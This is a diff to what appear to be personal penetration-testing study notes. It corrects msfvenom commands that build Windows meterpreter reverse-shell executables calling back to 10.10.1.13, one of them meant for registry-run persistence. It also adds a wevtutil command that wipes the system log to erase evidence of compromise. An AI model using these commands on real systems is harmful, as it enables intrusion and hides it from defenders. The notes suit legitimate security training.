@@ -369,12 +369,13 @@ tool used
 #### [[Metasploit]]
 
 ```bash
-msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/test.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
 ```
 > this is to create a reverse shell .exe payload
 
 ```bash
-msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+
 ```
 > this will create a payload that we'll upload into the run registry  of windows machine
 
@@ -498,7 +499,7 @@ techniques to clear the evidence of security compromise ⇒
 #tool/windows 
 
 > it is a utility that can be used to wipe out the logs of target system.
-> run through PowerShell
+> right click and run as administrator
 
 #### [[wevtutil]]
 #tool/windows 
@@ -510,7 +511,7 @@ techniques to clear the evidence of security compromise ⇒
 > > 2. run queries
 > > 3. export, archive, and clear logs.
 
-→ open `cmd` with admin privileges
+→ open `cmd` with administrator privileges
 ```
 wevtutil el
 ```
@@ -518,6 +519,8 @@ wevtutil el
 
 ```
 wevtutil cl <log-name>
+wevtutil cl system
+
 ```
 > cl OR clear-log = clears a log\
 > log name can be obtained from previous command
